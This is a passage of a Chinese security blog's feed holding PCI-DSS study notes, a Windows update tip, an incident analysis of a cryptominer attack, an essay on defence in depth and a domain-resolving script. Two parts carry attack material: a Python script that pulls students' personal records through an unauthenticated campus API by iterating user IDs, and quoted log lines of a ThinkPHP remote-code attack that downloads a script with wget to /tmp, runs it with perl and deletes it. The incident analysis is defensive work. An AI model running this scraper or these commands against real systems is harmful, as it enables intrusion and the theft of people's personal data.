src="https://upload-images.jianshu.io/upload_images/6269327-7bdc0fa98040fe6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.3"><br>和之前的要求一样，我们有这样的保护策略，就得有详细的文件记录，并确保我们所实施的和文件的统一，以及更新保护策略时即使更新文件。并且确保和此相关的所有工作人员都已经理解并学习了整个安全政策和操作流程。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第四点要求不是很多，但是总结来说我们就是要确保我们传输的敏感数据必须在安全的信道中传输（通过安全的服务或者协议比如https），如果不能确保信道的安全，则必须使用强效的加密措施。<br>具体的第二个区域（保护持卡人数据）的两个要点也就结束了。对已存储的持卡人数据进行保护，对传输中的持卡人数据进行保护，虽然只有两个重要的环节，但是需要做的工作有很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-四&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-四&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(四)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(四)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(七)</title>
    <link href="http://rliyuqing.github.io/2019/04/15/20.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/20. PCI-DSS(V3.2.1)学习笔记(七)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:25.532Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-七"><a href="#PCI-DSS-V3-2-学习笔记-七" class="headerlink" title="PCI-DSS(V3.2)学习笔记(七)"></a>PCI-DSS(V3.2)学习笔记(七)</h1><hr><h1 id="四、实施强效的访问控制"><a href="#四、实施强效的访问控制" class="headerlink" title="四、实施强效的访问控制"></a>四、实施强效的访问控制</h1><p>PCI DSS的第四个区域就是实施强效的访问控制，这里的访问控制不仅仅是前面提到的针对某个系统的访问控制，而是针对持卡人数据环境的所有访问来说的；不仅仅是某些具体的业务，应用程序，还有系统组件以及物理的访问等等统统要在我们的访问控制的措施保护之内。</p><h2 id="要求7-：按业务知情需要限制持卡人数据的访问"><a href="#要求7-：按业务知情需要限制持卡人数据的访问" class="headerlink" title="要求7 ：按业务知情需要限制持卡人数据的访问"></a>要求7 ：按业务知情需要限制持卡人数据的访问</h2><p>按业务的知情需要，知情需要，我的理解就是能保证工作人员正常执行工作职责的最小权限。也正好就是我们上面提到的最小权限原则，只授予用户必要的权限，不要过度授权，这样也减少系统、网络、应用、数据库出错的机会。</p><h3 id="7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据"><a href="#7-1-仅有工作人员需要的个人才能访问系统组件和持卡人数据" class="headerlink" title="7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据"></a>7.1 仅有工作人员需要的个人才能访问系统组件和持卡人数据</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-bc86ab515c17ec7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1"><br>首先我们要减少对持卡人数据的访问，只有那些有工作需要并且有明确授权的用户才能访问持卡人数据所在的环境的系统组件或者持卡人数据。<br>对于我们怎么才能控制因为工作需要且有明确授权的用户访问呢，我们需要有一定的访问控制流程来实现，至少满足下面的这些要求（7.1.1+7.1.4）</p><h4 id="7-1-1-为每个角色定义访问需要"><a href="#7-1-1-为每个角色定义访问需要" class="headerlink" title="7.1.1 为每个角色定义访问需要"></a>7.1.1 为每个角色定义访问需要</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-76c1881aa088b2cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.1"><br>包括：<br>1、每个角色依据工作职能需要访问的系统组件和数据资源<br>2、访问资源所需的全线级别（例如，用户、管理员等）<br>我们之前已经用到了用户和用户组的管理方法来进行网络组建的管理，罪域每个用户，每个角色我们根据每个角色的需求来确定他是否对一个系统组件或者数据有访问权限。<br>比如我们一个测试人员，他应该只对测试环境的数据和组件有访问权限，对线上的数据没有访问需求，也就不分配访问权限。<br>我们要根据每一个角色工作和业务需要授予他必要的权限，在确保最先权限的原则的同时我们要保证授予的权限足够角色进行正常的工作。</p><h5 id="7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限"><a href="#7-1-2-将特权用户ID的访问权限限制为指定工作职责所需的最小权限" class="headerlink" title="7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限"></a>7.1.2 将特权用户ID的访问权限限制为指定工作职责所需的最小权限</h5><p><img src="https://upload-images.jianshu.io/upload_images/6269327-fcbd367bca16a103.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-bc07a84a0e48a3ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.2-2"><br>特权用户ID就是指的某些应用程序或者服务的特权用户，比如数据库的管理员，备份管理员。在默认情况下这些应用程序或者服务的特权用户可能会拥有超出他所需要执行工作之外的权限；所有我们要对这些特权用户进行授权管理，确保分配给他们的权限也符合最小权限原则。</p><h4 id="7-1-3-基于个人的工作分类和职能分配访问权限"><a href="#7-1-3-基于个人的工作分类和职能分配访问权限" class="headerlink" title="7.1.3 基于个人的工作分类和职能分配访问权限"></a>7.1.3 基于个人的工作分类和职能分配访问权限</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2016b312ac935202.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.3"><br>就是对于个人的工作和职能累分配权限。在我们以及定义了觉得的访问需求之后，我们需要将这个需求转化为对应的权限，我们就可以根据之前定义和角色来赋予个人访问权限。</p><h4 id="7-1-4-需要制定所需权限的被授权方作出书面批准"><a href="#7-1-4-需要制定所需权限的被授权方作出书面批准" class="headerlink" title="7.1.4 需要制定所需权限的被授权方作出书面批准"></a>7.1.4 需要制定所需权限的被授权方作出书面批准</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9cb821f90460a686.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.1.4"><br>对于对个人进行赋予对用的角色的操作我们需要有一定的记录，以供检查，确保我们授予的权限和分配给个人的角色匹配。</p><h3 id="7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"><a href="#7-2-为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外" class="headerlink" title="7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外"></a>7.2 为系统组件监理访问控制系统，以根据用户的知情需要限制访问，并将系统设为“全部拒绝”，特别允许访问时除外</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d2f6bb8460f07d61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2"><br>这就是白名单的思想，我们为系统组件建立访问控制的系统，默认是所有的人都不能访问，然后建立白名单，只有特别允许访问的才能访问。<br>该访问控制系统必须包含以下内容：</p><h4 id="7-2-1-所有系统组件范围"><a href="#7-2-1-所有系统组件范围" class="headerlink" title="7.2.1 所有系统组件范围"></a>7.2.1 所有系统组件范围</h4><h4 id="7-2-2-基于工作分类和职能为个人分配权限"><a href="#7-2-2-基于工作分类和职能为个人分配权限" class="headerlink" title="7.2.2 基于工作分类和职能为个人分配权限"></a>7.2.2 基于工作分类和职能为个人分配权限</h4><h4 id="7-2-3-将“拒绝全部”设为默认配置"><a href="#7-2-3-将“拒绝全部”设为默认配置" class="headerlink" title="7.2.3 将“拒绝全部”设为默认配置"></a>7.2.3 将“拒绝全部”设为默认配置</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-f3112c99ecf6eb19.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.2.1-7.2.3"><br>对于这个系统组件的访问控制系统我们必须要保证至少达到上面三个要求。<br>首先确保所有的系统组件在我们的访问控制系统的保护内，然后我们确定我们这个访问控制系统已经根据PCI DSS的要求为个人分配了权限，最后我们要保证默认设置是默认是“DENY ALL”，拒绝所有，使用白名单会比黑名单安全很多。</p><h3 id="7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"><a href="#7-3-确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序" class="headerlink" title="7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序"></a>7.3 确保已记录、正在使用且所有相关方了解用于持卡人数据访问的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cf5f8190b03c8dc6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.3"><br>每一个要求的最后都有一个这样的小要求。我们要确保我们制定的限制对持卡人数据访问的方案有详细的记录，并且相关的工作人员都已经学习，并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说要求7主要提到三个思想，第一个是最小权限的原则，第二个是对个人使用已创建的角色来赋予权限的思想，第三个就是白名单的思想了。<br>最小权限就不说了前面提了很多次。说说第二个，这个就是我们首先定义每个角色，比如，测试员，操作员，监控员这样不同的角色，同时对每个角色定义所需的访问需求，明确角色和相对应的访问需求后（比如监控员只查看所有的配置的权限，没有更改的权限），这样我们就可以根据个人的工作职能来授予访问权限了。白名单呢，在很多方面是比黑名单更加安全的，我们默认拒绝所有的，只接受我们认为安全的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-七&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-七&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(七)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(七)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>WIN10自动更新</title>
    <link href="http://rliyuqing.github.io/2019/04/15/22.WIN10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0/"/>
    <id>http://rliyuqing.github.io/2019/04/15/22.WIN10自动更新/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:37.987Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="WIN10自动更新"><a href="#WIN10自动更新" class="headerlink" title="WIN10自动更新"></a>WIN10自动更新</h1><hr><p>对于win10的自动更新，好多人很烦恼，有时候更新完会有很奇怪的BUG出现，所以很多人装完系统之后总会想方设法的禁止win10的更新。网上也有很多方法，改注册表的都有。<br>对于网络稳定的电脑，比如台式机，不轻易变更，我们可以将网络设置成计费模式，win10就不会自动更新了，但是右下角老会有提示，但是我没有强迫症，所有还可以忍受。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-1de6c80f7a10b3e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="累积了10次更新了"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-15c06a188c164397.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="按流量计费打开"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-eecbea61dd4994e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="右下角标识"><br>对于个人笔记本或者网络经常变更的设备，也可以利用脚本之类的通过上面的方法解决，还没实践，以后有机会再说。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;WIN10自动更新&quot;&gt;&lt;a href=&quot;#WIN10自动更新&quot; class=&quot;headerlink&quot; title=&quot;WIN10自动更新&quot;&gt;&lt;/a&gt;WIN10自动更新&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;对于win10的自动更新，好多人很烦恼，有时候更新完会有很奇怪的
      
    
    </summary>
    
      <category term="其他" scheme="http://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="http://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>校园提供给第三方的接口信息泄露</title>
    <link href="http://rliyuqing.github.io/2019/04/15/23.%E6%A0%A1%E5%9B%AD%E6%8F%90%E4%BE%9B%E7%BB%99%E7%AC%AC%E4%B8%89%E6%96%B9%E7%9A%84%E6%8E%A5%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20-%20%E5%89%AF%E6%9C%AC/"/>
    <id>http://rliyuqing.github.io/2019/04/15/23.校园提供给第三方的接口信息泄露 - 副本/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:43.489Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="校园提供给第三方的接口信息泄露"><a href="#校园提供给第三方的接口信息泄露" class="headerlink" title="校园提供给第三方的接口信息泄露"></a>校园提供给第三方的接口信息泄露</h1><hr><p>之前学校和第三方合作，让我们用到的某款app，好奇测试，发现其有严重的身份验证缺失，可以随意访问个人信息，用python写了个可以爬取所有信息的脚本。（很早之前的了，做个记录）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2018/6/23</span><br><span class="line"># @Author  : XDN01</span><br><span class="line"># @Site    : www.raosong.cc</span><br><span class="line"># @File    : xd-xiaoweiapp-spider.py</span><br><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">with open(&quot;./spider.csv&quot;,&quot;w&quot;,encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    key_array = [&apos;userId&apos;,&apos;userNum&apos;,&apos;name&apos;,&apos;sex&apos;,&apos;address&apos;,&apos;certificate&apos;,&apos;nationId&apos;,&apos;nationName&apos;,</span><br><span class="line">   &apos;phone&apos;,&apos;email&apos;,&apos;schoolName&apos;,&apos;faculty&apos;,&apos;grade&apos;,&apos;class&apos;,&apos;profession&apos;,&apos;sysStuDetailId&apos;,&apos;sourceId&apos;,</span><br><span class="line">    &apos;sourceName&apos;,&apos;feature&apos;,&apos;type&apos;,&apos;suspId&apos;]</span><br><span class="line">    writer.writerow(key_array)</span><br><span class="line"></span><br><span class="line">    for a in range(2,20):</span><br><span class="line">        url = &apos;http://example.com/search.php?userId=&#123;&#125;&apos;.format(a)</span><br><span class="line">        json_data =requests.get(url).json()[&apos;data&apos;]</span><br><span class="line">        # print(json_data)</span><br><span class="line">        value_array = []</span><br><span class="line">        for k in key_array:</span><br><span class="line">            if k in json_data:</span><br><span class="line">                value_array.append(json_data[k])</span><br><span class="line">            else:</span><br><span class="line">                value_array.append(&apos;null&apos;)</span><br><span class="line">        # print(value_array)</span><br><span class="line">        writer.writerow(value_array)</span><br><span class="line">        print(&apos;第&#123;&#125;条数据写入完成&apos;.format(a-1))</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;校园提供给第三方的接口信息泄露&quot;&gt;&lt;a href=&quot;#校园提供给第三方的接口信息泄露&quot; class=&quot;headerlink&quot; title=&quot;校园提供给第三方的接口信息泄露&quot;&gt;&lt;/a&gt;校园提供给第三方的接口信息泄露&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;之前学校和第三方
      
    
    </summary>
    
      <category term="水平权限" scheme="http://rliyuqing.github.io/categories/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
    
      <category term="水平权限" scheme="http://rliyuqing.github.io/tags/%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90/"/>
    
  </entry>
  
  <entry>
    <title>一次挖矿病毒攻击分析</title>
    <link href="http://rliyuqing.github.io/2019/04/15/24.%E4%B8%80%E6%AC%A1%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>http://rliyuqing.github.io/2019/04/15/24.一次挖矿病毒攻击分析/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:49.943Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="一次挖矿病毒攻击分析"><a href="#一次挖矿病毒攻击分析" class="headerlink" title="一次挖矿病毒攻击分析"></a>一次挖矿病毒攻击分析</h1><hr><p>这两天期末了，最近老板这里突然来了个任务，客户服务器被攻击了，某台机器的cpu一直都跑满了，持续高负荷状态，客户公司的运营实在没有办法找到了我们。<br>先说一说之前这台服务器也出现过问题，被两波人搞过，一波写了webshell，另个一种了挖矿病毒，都被清除了，当然这些我都没有参与。<br>因为老板比较忙，我和另一个小伙伴接手进行分析，我们拿到这台服务器，既然是web服务器，最好得最有效的办法就是看web日志，但是这个日志是在很多，这就考虑经验问题了，另一个小伙伴道行比我深，他发现了痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat aso_access.log | grep <span class="string">"wget"</span> | grep <span class="string">"/2019"</span>|grep <span class="string">"200"</span></span><br></pre></td></tr></table></figure></p><p>通过很多尝试，在筛选“wget”的时候找到了攻击痕迹。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>emmmmm，看到这个POST的请求，基本可以猜测出就是这几天爆出的thinkphp新的rce，具体读者可以去看看相关的报告，rce的分析网上也有了，有想去的可以去了解一下。根据这条日志，筛选ip我们找到了具体的攻击痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>上传ibus脚本文件到tmp目录下命名为指定文件，这里www用户有对tmp目录的读写权限。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - -  [xx/xx/2019:xx:xx:xx +0800]  <span class="string">"POST /?module=perl /tmp/6b5a412bb56c0f0af33017cc88718de3;sleep 2;rm -rf /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 3699 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p><p>执行tmp中上传的指定文件，并等待执行完成，删除文件.<br>本地虚拟环境执行了一下这个ibus脚本：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-c63d320e2b0401d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="本地执行脚本"><br>可以看到这里执行生成了三个sh简单加密的脚本文件：nmi，nbus和.dbus是哪个文件，这三个脚本文件解密之后是三个cat和perl的脚本，分别执行了一下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /xxx/xxx/xxx/xxx/Favicon.ico | perl</span><br><span class="line">$ cat /xxx/xxx/pkcs | perl</span><br><span class="line">$ cat /xxx/xxx/xxx/xxxxx/xxx/xxxxxx/mockup | perl</span><br></pre></td></tr></table></figure></p><p>执行了三个perl脚本，就是挖矿的脚本了。最后我们把生成的恶意文件备份之后就进行清除了，总共是三个sh脚本，三个perl挖矿脚本和两个记录id的随机数之类的文件。<br>怎么说呢，这次攻击分析看似挺简单的，但是最难的部分，从日志里找出攻击者的恶意访问是很困难的，需要有很多的经验，比如对最近新漏洞的了解，以及各类典型漏洞的攻击方式，才能及时的从庞大的日志文件中根据特征找到攻击者的痕迹。<br>安全从业者还是十分吃经验的，博主也会更多的在实战中历练自己，也会分享记录自己的经验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;一次挖矿病毒攻击分析&quot;&gt;&lt;a href=&quot;#一次挖矿病毒攻击分析&quot; class=&quot;headerlink&quot; title=&quot;一次挖矿病毒攻击分析&quot;&gt;&lt;/a&gt;一次挖矿病毒攻击分析&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;这两天期末了，最近老板这里突然来了个任务，客户服务器被攻
      
    
    </summary>
    
      <category term="攻击分析" scheme="http://rliyuqing.github.io/categories/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
    
      <category term="攻击分析" scheme="http://rliyuqing.github.io/tags/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>内网隔离和纵深防御浅谈</title>
    <link href="http://rliyuqing.github.io/2019/04/15/25.%E5%86%85%E7%BD%91%E9%9A%94%E7%A6%BB%E5%92%8C%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E6%B5%85%E8%B0%88/"/>
    <id>http://rliyuqing.github.io/2019/04/15/25.内网隔离和纵深防御浅谈/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:51:03.068Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="内网隔离和纵深防御浅谈"><a href="#内网隔离和纵深防御浅谈" class="headerlink" title="内网隔离和纵深防御浅谈"></a>内网隔离和纵深防御浅谈</h1><hr><p>今天在给客户的公司做日常的测试的时候发现了一个内网的系统对外开放了，本来这是一件挺正常的事情，因为企业总会出现各种生产环境的一些或大或小的变动，可能某些时候就会出现某个不该对外开放的系统对外开放了，但是因为都有验证甚至二次验证，所以安全隐患不是很高。这次的这个客户企业的机器之前也出现过几次内网系统对外网公开了，但是都没有用什么大的威胁，外网的可操作性也很少，爆破账号密码都十分的困难。但是这次的对外开放的这个系统竟然出现了可以直接匿名用户登录并web端执行脚本的情况，虽然匿名用户没有执行sh脚本的额权限，但是有执行python脚本的权限，可以直接反弹shell，于是赶紧联系了老板，与客户公司取得联系及时修复漏洞。<br>是一个Zeppelin的线上系统的匿名用户登录的情况。为什么这次要特点说一说这次遇到的情况呢？因为这是我所期待，也是预料之中会出现的情况。<br>之前在客户的公司实习了一段时间。再去客户的公司事实习之前，自己也对他们有一些简单的测试，发现他们内外网隔离做的很好，改对外开放的对外开放，不该对外开放的一个都访问不了。但是在公司实习的时候，进入内网之后才发现内网的各种系统还是很乱的，许多系统为了方便都是没有验证机制的，甚至连企业的wiki文档系统都不需要验证员工身份，里面许多敏感文件。这就让我想起了之前老板和我们说过的，那些表面安全工作做得很好的内部可能漏洞百出，在实习的两个礼拜内，企业内部的src也是刷了很多。所以我觉得肯定会出现问题，只有某个系统因为谋些环境变动而对外网开放，就很容易被攻击者轻松日穿。<br>其实这也是企业发展的正常道路，客户公司也是最近才成立安全部门的，在资源有限的情况下优先做好内外网隔离是个正确的选择。但是只做内网隔离不做纵深防御是错误的。<br>做好内网隔离是企业安全的基础，在资源有限的情况下优先做内网隔离，但是纵深防御也是十分必要的。认为做好了隔离而忽略了内网的防御，就很容易出现一旦有机器在公网暴露就会被轻松攻破。风险分析的模型不止包括事件发生的概率，还有产生的危险程度。低概率但是带来严重影响的攻击也是会出现高风险值。资源有限的情况也需要考虑到资源的合理分配了，优先做隔离是资源最大化利用的有效手段。<br>优先做隔离没有错，只做隔离却没有做纵深防御是错的</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;内网隔离和纵深防御浅谈&quot;&gt;&lt;a href=&quot;#内网隔离和纵深防御浅谈&quot; class=&quot;headerlink&quot; title=&quot;内网隔离和纵深防御浅谈&quot;&gt;&lt;/a&gt;内网隔离和纵深防御浅谈&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;今天在给客户的公司做日常的测试的时候发现了一个内
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>python根据域名获取ip</title>
    <link href="http://rliyuqing.github.io/2019/04/15/26.python%E6%A0%B9%E6%8D%AE%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96ip/"/>
    <id>http://rliyuqing.github.io/2019/04/15/26.python根据域名获取ip/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:51:18.432Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="python根据域名获取ip"><a href="#python根据域名获取ip" class="headerlink" title="python根据域名获取ip"></a>python根据域名获取ip</h1><hr><p>过完年了，重新开始搬砖了。最近客户公司要进行全面的安全检测，于是给我们了一份很全的域名列表，然后让我们从外网进行简单的测试，但是这个域名实在是太多太多了，而且公司的域名很打一部分都是解析到内网的，外网根本无法访问，于是写了个简单的小脚本进行筛选，主要功能就是获取域名所对应的ip以及剔除解析到内网的域名。用队列和多线程的结构，速度能快很多，毕竟量上去了单线程还是很慢的。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/02/25</span></span><br><span class="line"><span class="comment"># @Author  : XDN01</span></span><br><span class="line"><span class="comment"># @Site    : www.raosong.cc</span></span><br><span class="line"><span class="comment"># @File    : get_public_ip.py</span></span><br><span class="line">import socket</span><br><span class="line">import csv</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">q = queue.Queue()</span><br><span class="line">threading_num = 50</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(<span class="string">"alldomain.txt"</span> , <span class="string">"r"</span>) as f:</span><br><span class="line">    filedata = f.readlines()</span><br><span class="line">    q.put(filedata)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    <span class="keyword">while</span> not q.empty():</span><br><span class="line">        filedata = q.get()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> filedata:</span><br><span class="line">            url = str(i).replace(<span class="string">"\n"</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="comment">#print(url)</span></span><br><span class="line">            try:</span><br><span class="line">                myaddr = socket.getaddrinfo(url, <span class="string">'http'</span>)</span><br><span class="line">                <span class="comment">#print(str(myaddr[0][4][0])[:3])</span></span><br><span class="line">                <span class="keyword">if</span> str(myaddr[0][4][0])[:3] != str(172):</span><br><span class="line">                    <span class="comment">#print(url+" "+str(myaddr[0][4][0]))</span></span><br><span class="line">                    <span class="comment">#value_array.append(url).append(str(myaddr[0][4][0]))</span></span><br><span class="line">                    with open(<span class="string">"public_domain.csv"</span>,<span class="string">"a"</span>) as fw:</span><br><span class="line">                        writer = csv.writer(fw)</span><br><span class="line">                        writer.writerow([url,str(myaddr[0][4][0])])</span><br><span class="line">            except:</span><br><span class="line">                <span class="comment">#print('can't open')</span></span><br><span class="line">                pass</span><br><span class="line">        <span class="comment">#f.close()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'begin'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threading_num):</span><br><span class="line">        t = threading.Thread(target=run)</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;python根据域名获取ip&quot;&gt;&lt;a href=&quot;#python根据域名获取ip&quot; class=&quot;headerlink&quot; title=&quot;python根据域名获取ip&quot;&gt;&lt;/a&gt;python根据域名获取ip&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;过完年了，重新开始搬砖了
      
    
    </summary>
    
      <category term="小脚本" scheme="http://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="http://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(六)</title>
